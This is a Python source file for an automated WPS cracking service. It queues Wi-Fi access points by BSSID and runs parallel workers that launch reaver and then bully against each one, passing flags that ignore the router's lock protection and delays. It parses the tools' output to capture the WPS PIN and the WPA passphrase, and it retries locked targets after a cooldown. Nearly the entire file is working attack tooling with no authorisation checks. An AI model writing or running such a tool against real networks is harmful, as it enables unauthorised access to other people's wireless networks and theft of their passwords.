#!/usr/bin/env python3
"""
WPS Cracking Service
Automatically cracks WPS-enabled networks and stores results
"""

import subprocess
import threading
import time
import queue
from typing import Optional, Dict, List
from datetime import datetime
from pathlib import Path
import re


class WPSCrackingService:
    """Service for automated WPS PIN attacks"""

    def __init__(self, monitor_interface: str = "wlan0mon", output_dir: str = None, num_workers: int = 2):
        """
        Initialize WPS cracking service

        Args:
            monitor_interface: Wireless interface in monitor mode
            output_dir: Directory to store capture files (default: data/captures/wps)
            num_workers: Number of parallel attack workers (default: 2)
        """
        self.monitor_interface = monitor_interface
        self.output_dir = Path(output_dir) if output_dir else Path("data/captures/wps")
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Cracking queue and state
        self._crack_queue = queue.PriorityQueue()  # Changed to PriorityQueue for better sorting
        self._running = False
        self._worker_threads: List[threading.Thread] = []
        self._num_workers = num_workers
        self._current_targets: Dict[int, Optional[Dict]] = {}  # Track current target per worker
        self._lock = threading.Lock()

        # Track failed/slow targets with detailed error info
        self._failed_targets = {}  # {BSSID: {'timestamp': datetime, 'error': str, 'attempts': int}}
        self._locked_targets = {}  # {BSSID: {'timestamp': datetime, 'error': str}}

        # Statistics
        self.stats = {
            'total_attempted': 0,
            'total_cracked': 0,
            'total_failed': 0,
            'total_locked': 0,
            'queue_size': 0,
            'active_workers': 0
        }

        # Results callback
        self.on_result_callback = None

    def start(self):
        """Start the WPS cracking workers"""
        if self._running:
            print("[WPS] Service already running")
            return

        self._running = True

        # Start multiple worker threads
        for i in range(self._num_workers):
            self._current_targets[i] = None
            worker = threading.Thread(target=self._worker_loop, args=(i,), daemon=True)
            worker.start()
            self._worker_threads.append(worker)

        print(f"[WPS] Cracking service started with {self._num_workers} parallel workers")

    def stop(self):
        """Stop the WPS cracking workers"""
        self._running = False

        # Wait for all workers to finish
        for worker in self._worker_threads:
            worker.join(timeout=5)

        self._worker_threads.clear()
        print("[WPS] Cracking service stopped")

    def add_target(self, bssid: str, ssid: str = "", channel: int = 1, priority: int = 0):
        """
        Add a WPS network to the cracking queue

        Args:
            bssid: Target BSSID
            ssid: Target SSID (optional)
            channel: Target channel
            priority: Priority (higher = process first)
        """
        # Skip if target is known to be locked (check if enough time has passed)
        from datetime import datetime, timedelta

        if bssid in self._locked_targets:
            locked_info = self._locked_targets[bssid]
            time_since_lock = datetime.utcnow() - locked_info['timestamp']
            if time_since_lock < timedelta(hours=24):  # Retry after 24 hours
                print(f"[WPS] Skipping locked target: {ssid or bssid} ({bssid}) - Last attempt: {locked_info['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}, Error: {locked_info['error']}")
                return
            else:
                print(f"[WPS] Retrying previously locked target {bssid} (cooldown expired)")
                del self._locked_targets[bssid]

        # Check if target has failed before (allow retry after cooldown)
        if bssid in self._failed_targets:
            failed_info = self._failed_targets[bssid]
            time_since_fail = datetime.utcnow() - failed_info['timestamp']
            attempts = failed_info.get('attempts', 1)

            # Exponential backoff: 1 hour, 6 hours, 24 hours
            cooldown_hours = min(1 * (2 ** (attempts - 1)), 24)

            if time_since_fail < timedelta(hours=cooldown_hours):
                print(f"[WPS] Skipping previously failed target: {ssid or bssid} ({bssid})")
                print(f"      Last attempt: {failed_info['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}, Attempts: {attempts}, Error: {failed_info['error']}")
                print(f"      Retry available in: {cooldown_hours - time_since_fail.total_seconds()/3600:.1f} hours")
                return
            else:
                print(f"[WPS] Retrying previously failed target {bssid} (cooldown expired, attempt #{attempts + 1})")
                # Keep the counter but update timestamp when we try again

        target = {
            'bssid': bssid,
            'ssid': ssid,
            'channel': channel,
            'priority': priority,
            'added_at': datetime.utcnow()
        }

        # PriorityQueue uses negative priority for descending order
        self._crack_queue.put((-priority, bssid, target))
        self.stats['queue_size'] = self._crack_queue.qsize()
        print(f"[WPS] Added target: {ssid or bssid} (queue size: {self.stats['queue_size']})")

    def get_status(self) -> Dict:
        """Get current service status"""
        with self._lock:
            active_workers = sum(1 for target in self._current_targets.values() if target is not None)
            return {
                'running': self._running,
                'current_targets': list(self._current_targets.values()),
                'active_workers': active_workers,
                'queue_size': self._crack_queue.qsize(),
                'failed_targets': len(self._failed_targets),
                'locked_targets': len(self._locked_targets),
                'stats': self.stats.copy()
            }

    def _worker_loop(self, worker_id: int):
        """
        Main worker loop for processing crack queue

        Args:
            worker_id: Unique worker ID for tracking
        """
        print(f"[WPS] Worker {worker_id} started")

        while self._running:
            try:
                # Get next target (with timeout to allow graceful shutdown)
                try:
                    priority, bssid, target = self._crack_queue.get(timeout=2)
                except queue.Empty:
                    continue

                with self._lock:
                    self._current_targets[worker_id] = target
                    self.stats['queue_size'] = self._crack_queue.qsize()
                    self.stats['active_workers'] = sum(1 for t in self._current_targets.values() if t is not None)

                print(f"[WPS] Worker {worker_id} starting attack on {target['ssid'] or target['bssid']}")

                # Attempt to crack
                result = self._crack_wps_target(target)

                # Update statistics and tracking
                from datetime import datetime
                with self._lock:
                    self.stats['total_attempted'] += 1
                    if result['status'] == 'cracked':
                        self.stats['total_cracked'] += 1
                        # Remove from failed/locked if it was there
                        self._failed_targets.pop(target['bssid'], None)
                        self._locked_targets.pop(target['bssid'], None)
                    elif result['status'] == 'locked':
                        self.stats['total_locked'] += 1
                        self._locked_targets[target['bssid']] = {
                            'timestamp': datetime.utcnow(),
                            'error': result.get('error', 'WPS locked/rate limited')
                        }
                        print(f"[WPS] Target locked: {target['bssid']} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    elif result['status'] == 'failed':
                        self.stats['total_failed'] += 1
                        # Track failure with timestamp and increment attempt counter
                        attempts = self._failed_targets.get(target['bssid'], {}).get('attempts', 0) + 1
                        self._failed_targets[target['bssid']] = {
                            'timestamp': datetime.utcnow(),
                            'error': result.get('error', 'Unknown failure'),
                            'attempts': attempts
                        }
                        print(f"[WPS] Attack failed on {target['bssid']} (attempt #{attempts}) at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {result.get('error', 'Unknown')}")

                # Call result callback if set
                if self.on_result_callback:
                    try:
                        self.on_result_callback(target, result)
                    except Exception as e:
                        print(f"[WPS] Error in result callback: {e}")

                with self._lock:
                    self._current_targets[worker_id] = None
                    self.stats['active_workers'] = sum(1 for t in self._current_targets.values() if t is not None)

            except Exception as e:
                print(f"[WPS] Error in worker {worker_id} loop: {e}")
                import traceback
                traceback.print_exc()

                with self._lock:
                    self._current_targets[worker_id] = None

        print(f"[WPS] Worker {worker_id} stopped")

    def _crack_wps_target(self, target: Dict) -> Dict:
        """
        Attempt to crack a WPS target

        Args:
            target: Target dictionary with bssid, ssid, channel

        Returns:
            Result dictionary with status, pin, psk, etc.
        """
        bssid = target['bssid']
        ssid = target['ssid'] or bssid
        channel = target['channel']

        print(f"[WPS] Starting WPS attack on {ssid} ({bssid}) on channel {channel}")

        result = {
            'status': 'failed',
            'bssid': bssid,
            'ssid': ssid,
            'pin': None,
            'psk': None,
            'started_at': datetime.utcnow(),
            'completed_at': None,
            'error': None
        }

        # Try reaver first (most reliable for WPS)
        reaver_result = self._try_reaver(bssid, channel)
        if reaver_result['status'] == 'cracked':
            result.update(reaver_result)
            result['completed_at'] = datetime.utcnow()
            return result
        elif reaver_result['status'] == 'locked':
            result['status'] = 'locked'
            result['error'] = 'WPS locked (rate limiting active)'
            result['completed_at'] = datetime.utcnow()
            return result

        # Try bully as fallback
        print(f"[WPS] Reaver failed, trying bully on {ssid}")
        bully_result = self._try_bully(bssid, channel)
        if bully_result['status'] == 'cracked':
            result.update(bully_result)
            result['completed_at'] = datetime.utcnow()
            return result

        # Both failed
        result['error'] = 'Both reaver and bully failed'
        result['completed_at'] = datetime.utcnow()
        return result

    def _try_reaver(self, bssid: str, channel: int, timeout: int = 120) -> Dict:
        """
        Attempt WPS crack using reaver

        Args:
            bssid: Target BSSID
            channel: Target channel
            timeout: Max time in seconds (default 2 minutes)

        Returns:
            Result dict
        """
        result = {'status': 'failed', 'pin': None, 'psk': None}

        # Check if reaver is installed
        if not self._check_tool_installed('reaver'):
            result['error'] = 'reaver not installed'
            return result

        try:
            # Build reaver command
            # -i: interface, -b: bssid, -c: channel, -vv: very verbose, -L: ignore locks, -N: no nacks
            cmd = [
                'reaver',
                '-i', self.monitor_interface,
                '-b', bssid,
                '-c', str(channel),
                '-vv',
                '-L',  # Ignore locked state
                '-N',  # Don't send NACK packets
                '-d', '0',  # Delay between attempts
                '-T', '0.5',  # Timeout
                '-r', '3:15'  # Retries: 3 attempts with 15 second timeout
            ]

            print(f"[WPS] Executing: {' '.join(cmd)}")

            # Run reaver with timeout
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # Monitor output
            start_time = time.time()
            pin_found = False
            consecutive_failures = 0
            max_consecutive_failures = 10  # Abort after 10 consecutive failures

            while True:
                # Check timeout
                if time.time() - start_time > timeout:
                    process.kill()
                    result['error'] = 'timeout'
                    break

                # Read output
                line = process.stdout.readline()
                if not line:
                    # Process ended
                    break

                line = line.strip()
                print(f"[REAVER] {line}")

                # Check for WPS PIN
                if 'WPS PIN:' in line:
                    match = re.search(r'WPS PIN:\s*[\'"]?(\d{8})[\'"]?', line)
                    if match:
                        result['pin'] = match.group(1)
                        pin_found = True

                # Check for PSK
                if 'WPA PSK:' in line or 'PSK:' in line:
                    match = re.search(r'(?:WPA )?PSK:\s*[\'"]?([^\'"]+)[\'"]?', line)
                    if match:
                        result['psk'] = match.group(1).strip()
                        result['status'] = 'cracked'

                # Check for locked state or repeated failures
                if 'WARNING: Failed to associate' in line or 'WPS transaction failed' in line:
                    consecutive_failures += 1
                    if consecutive_failures >= max_consecutive_failures:
                        print(f"[WPS] Aborting: {consecutive_failures} consecutive association failures detected")
                        result['status'] = 'locked'
                        result['error'] = f'{consecutive_failures} consecutive association failures - target unreachable or locked'
                        process.kill()
                        break

                # Detect reaver's built-in failure detection
                if 'successive start failures' in line or 'failed connections in a row' in line:
                    print(f"[WPS] Aborting: Reaver detected repeated failures")
                    result['status'] = 'locked'
                    result['error'] = 'Reaver detected repeated failures - target unreachable or locked'
                    process.kill()
                    break

                if 'AP rate limiting' in line or 'Detected AP rate limiting' in line:
                    result['status'] = 'locked'
                    result['error'] = 'AP rate limiting detected'
                    process.kill()
                    break

            process.wait()

            # If we got PIN but no PSK, still consider partial success
            if pin_found and not result['psk']:
                result['status'] = 'pin_found'

        except Exception as e:
            result['error'] = str(e)
            print(f"[WPS] Reaver error: {e}")

        return result

    def _try_bully(self, bssid: str, channel: int, timeout: int = 120) -> Dict:
        """
        Attempt WPS crack using bully

        Args:
            bssid: Target BSSID
            channel: Target channel
            timeout: Max time in seconds (default 2 minutes)

        Returns:
            Result dict
        """
        result = {'status': 'failed', 'pin': None, 'psk': None}

        if not self._check_tool_installed('bully'):
            result['error'] = 'bully not installed'
            return result

        try:
            # Build bully command
            cmd = [
                'bully',
                self.monitor_interface,
                '-b', bssid,
                '-c', str(channel),
                '-v', '3',  # Verbosity level
                '-L'  # Ignore locks
            ]

            print(f"[WPS] Executing: {' '.join(cmd)}")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            start_time = time.time()

            while True:
                if time.time() - start_time > timeout:
                    process.kill()
                    result['error'] = 'timeout'
                    break

                line = process.stdout.readline()
                if not line:
                    break

                line = line.strip()
                print(f"[BULLY] {line}")

                # Parse bully output for PIN and PSK
                if 'Pin:' in line or 'PIN:' in line:
                    match = re.search(r'(?:Pin|PIN):\s*(\d{8})', line)
                    if match:
                        result['pin'] = match.group(1)

                if 'Key:' in line or 'PSK:' in line or 'Passphrase:' in line:
                    match = re.search(r'(?:Key|PSK|Passphrase):\s*([^\s]+)', line)
                    if match:
                        result['psk'] = match.group(1).strip()
                        result['status'] = 'cracked'

                if 'rate limit' in line.lower():
                    result['status'] = 'locked'
                    process.kill()
                    break

            process.wait()

        except Exception as e:
            result['error'] = str(e)
            print(f"[WPS] Bully error: {e}")

        return result

    def _check_tool_installed(self, tool: str) -> bool:
        """Check if a tool is installed"""
        try:
            result = subprocess.run(['which', tool], capture_output=True, timeout=2)
            return result.returncode == 0
        except:
            return False


# Singleton instance
_wps_service_instance: Optional[WPSCrackingService] = None


def get_wps_service(monitor_interface: str = "wlan0mon") -> WPSCrackingService:
    """
    Get singleton WPS cracking service instance

    Args:
        monitor_interface: Monitor mode interface

    Returns:
        WPSCrackingService instance
    """
    global _wps_service_instance

    if _wps_service_instance is None:
        _wps_service_instance = WPSCrackingService(monitor_interface)
    elif _wps_service_instance.monitor_interface != monitor_interface:
        # Update interface if different
        print(f"[WPS] Updating monitor interface: {_wps_service_instance.monitor_interface} -> {monitor_interface}")
        _wps_service_instance.monitor_interface = monitor_interface

    return _wps_service_instance


if __name__ == '__main__':
    # Test WPS cracking service
    print("Testing WPS Cracking Service")

    service = WPSCrackingService(monitor_interface="wlp7s0")

    def on_result(target, result):
        print(f"\n{'='*60}")
        print(f"RESULT for {target['ssid']} ({target['bssid']})")
        print(f"Status: {result['status']}")
        if result['pin']:
            print(f"PIN: {result['pin']}")
        if result['psk']:
            print(f"PSK: {result['psk']}")
        if result['error']:
            print(f"Error: {result['error']}")
        print(f"{'='*60}\n")

    service.on_result_callback = on_result
    service.start()

    # Add test target (replace with real WPS network)
    # service.add_target(bssid="AA:BB:CC:DD:EE:FF", ssid="TestWPS", channel=6)

    try:
        while True:
            status = service.get_status()
            print(f"\rQueue: {status['queue_size']} | Stats: {status['stats']}", end='')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping service...")
        service.stop()
